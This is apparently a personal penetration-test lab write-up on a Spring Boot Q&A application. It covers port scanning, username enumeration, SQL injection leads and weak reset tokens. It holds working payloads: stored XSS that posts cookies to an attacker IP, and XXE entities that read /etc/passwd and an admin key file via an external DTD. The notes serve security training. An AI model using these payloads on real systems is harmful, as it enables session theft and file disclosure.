# BlackBox
## Open Ports Basic
```
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8000/tcp open  http-alt       syn-ack ttl 63
8888/tcp open  sun-answerbook syn-ack ttl 63
```
## Open Ports Detailed
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ecff7c128f46307f58d5d699b60b7f9a (RSA)
|   256 35a6b439ed98461c17c7204731e759b0 (ECDSA)
|_  256 5eb2a8a315121c5eb4ab3224789fb741 (ED25519)
80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: A N S W E R S
8000/tcp open  jdwp            Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_252
|_jdwp-info: ERROR: Script execution failed (use -d to debug)
8888/tcp open  sun-answerbook?
```
### Port 22 SSH
Won't bother since the point of this is whitebox
### Port 8000 Java Debug Wire Protocol
Two existing exploits on searchsploit, need to confirm version numbers
- https://www.exploit-db.com/exploits/33789 (metasploit)
- https://www.exploit-db.com/exploits/46501 (python)

Neither seem to work but hey this is not oscp so meh.
### Port 8888 APACHE
Seems to be a mirror of port 80 because the same webapplication is running
### Port 80 APACHE
#### Browsing From a Blackbox Perspective
##### Interesting Pages
- /question
  - What's interesting here is that the form on this page specifically allows html tags, and furthermore requests the user not abuse this functionality.  
  The allowed tags are:
    - em
    - strong
    - code
  After submitting the website mentions "Anonymous users can ask questions, but the contents will be review by a moderator before they are published. Please don't abuse this. :)" so perhaps we can XSS and potentially CSRF an Moderator.
  It's probably worth it to bruteforce this page with html tags and see what is truly restricted.  
  In addition with the source code it's worth investigating how the filter mechanism works.
  - While Attempting to use xxs to gain a cookie I triggerred a sql error on the question title which is limited to 128 characters, with the following payload
    > "><script> fetch('http://192.168.119.143/cookie='+document.cookie, { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
- /thread/:id
  - We can iterate through all of the threads(questions) by visiting: /thread/:id
  - This would be the means of triggering an XSS/CSRF assuming we can get a user to visit the thread in question.
- /search?query= is an interesting potential sink
  - The search function could be used as an XSS/CSRF vector because we can search the contents on posts with it.
  - Searching a **'** characters triggers a SpringEL expression error
- /profile
  - Visiting this page produces the following error:
    > Whitelabel Error Page
    > This application has no explicit mapping for /error, so you are seeing this as a fallback.
    > Sun Jan 29 15:02:46 UTC 2023
    > There was an unexpected error (type=Not Found, status=404).
    > No message available
  Which after googling this hints that we are dealing with a springboot application which is a java framework
- /profile/:id
  - We can iterate through all of the user accounts by visiting: /profile/:id
  - There are 8 profiles total
  - /profile/0 redirects to index
  - /profile/9 redirects to index
  - /profile/1 is The administrator account
    - This account also seems to have a "Moderator" role
  - /profile/5 is "CARL"
    - This account also seems to have a "Moderator" role
  - /profile/7 is "EVELYN"
     - This account also seems to have a "Moderator" role
- /login
  - We have the capability to do username enumeration because:
    - With a valid username and incorrect password we receive an option to send a magic link. Specifically the text is:
      > Complex password got you down? Get a magic link and sign in from your email!
      - When in this menu the menu icon dropdown menu changes to include the options of:
        > Change Password
          - Unfortunately without the magic link clicking this returns us to /login
        > Logout
          - Clicking logout returns us to /login?logout
    - An incorrect password returns a message of
      > Please enter a valid username and password
- /generateMagicLink
  returns a 302 when user is not logged in
##### Potential users
- CARL
- Evelyn
- Demetri
- ALICE
- Bob
- ADMIN
- Franco
- Anonymous

##### Enumerated Users
Running the enumerate_users.ps1 script we find the following valid users
> admin is a valid username  
> Evelyn is a valid username  
> Carl is a valid username  
> Demetri is a valid username  
> Bob is a valid username  
> Franco is a valid username  

##### Enumerating Valid HTML tags on question
###### Allowed tags: STRONG
- The title field does is not vulnerable to vanilla XSS the values seam escaped
- The description field IS vulnerable to XSS, particularly stored XSS.
  - Anyone who visits the thread would be vulnerable
###### Allowed tags: CODE
Confirmed behavior with strong. Anything is a post title is escaped, but the description is valid a valid XSS vector
###### Allowed tags: EM
Didn't bother behavior validate with the tags above
###### Disallowed tags: script, img
A vanilla injection of:
```html
"><script>alert(document.domain)</script>
```
does NOT create a new thread I can only assume that it's filtered out in the application login.

We can have get a valid XSS with
```html
"><script>alert(document.domain)</script>
```
so we can potentially fish a user.
Here is a better payload
```html
"><script src='http://192.168.119.143/xss_working'></script>
```
##### Other things to note
- Up to this point, have not found any cookies or session info
# Whitebox
## noteworthy files
- UserController.java
  - This contains the email magic link logic
  - TokenUtil.Java creates the magic link. 
- Password.java
  - As it's named this has all the password logic
- AnswersApplication.java
  - This has all the main routes
- StringUtil.java
  - This has the logic for filters on the allowed tags, which we able to bypass by guessing
- AdminController.java
  - This has the user creation logic and routes
  - Interestingly there are two ways to create users
    - /admin/users/create
    - /admin/import for mass adding users
    - /admin/query takes an apikey parameter and furthermore you can only access this from an authenticated session
## Potential Paths to rce
- Bruteforcing the password reset token on /generateMagicLink
  - This method is particularly interesting because **TokenUtil.java** does not use java's SecureRandom which means we can guess magic password reset link
- SQLi via /search
  - The /search route is processed in **MainController.java** and there is no filtering on the **query** parameter
  - In **MainController.java** the **query** parameter is stored in a **keyword** variable which is then password to **questionDao.searchForQuestions(keyword)**
  - In **QuestionDAO.java** the search term is passed to the sql query with 3 tiimes in:
    > q.title like ? OR q.description like ? OR a.description like ? 
- XSS via /question description
  - more specifically we can enumerate the entire application from a logged on perspective using client.js from openitcockpit.
- SQLi via /question form title field
  - A title of more that 128 chars breaks the sql query, what's import to note is that This uses a prepared statement so may not be injection be as good.
- Potential blind sqli in updateModQuestion in QuestionDAO.java
  - This uses a naive sqli filter, defined in sqlutil.java
  - This is a post request to /moderate/{id}
    - furthermore this takes an *active* parameter which define the text to update in the moderated question.
  - For this to work we would have to set the *isAdmin* field in the *users* table to *True*
  - In terms of exfiltration this is a time-based blind vuln
    - we can set the *active* parameter to:
    > (select 1)=1

categories?order has a unauthenticated sqli


importing causes the application to make a get request for wrapper .dtd
Additionally if we look at /var/log/answers.log we can clearly see the filesystem is searching for /etc/password which of course does not exist
```xml
<!DOCTYPE data [ <!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "file:///etc/password" > <!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" > %dtd; ]> <test>&wrapper;</test>
```

working payload for /etc/password
```xml
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd" >
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
  %dtd;
  ]>
  <database><categories><category><name>&wrapper;</name></category></categories></database>
```
Here we can get the admin key
```xml
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
  %dtd;
  ]>
  <database><categories><category><name>&wrapper;</name></category></categories></database>
```
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://192.168.119.131/xxe-success" >
  <!ENTITY key SYSTEM "file:///home/student/adminkey.txt">
  %xxe;
  ]>
  <database><categories><category><name>&key;</name></category></categories></database>
```

psql -U webapp -d answers -h localhost -p 5432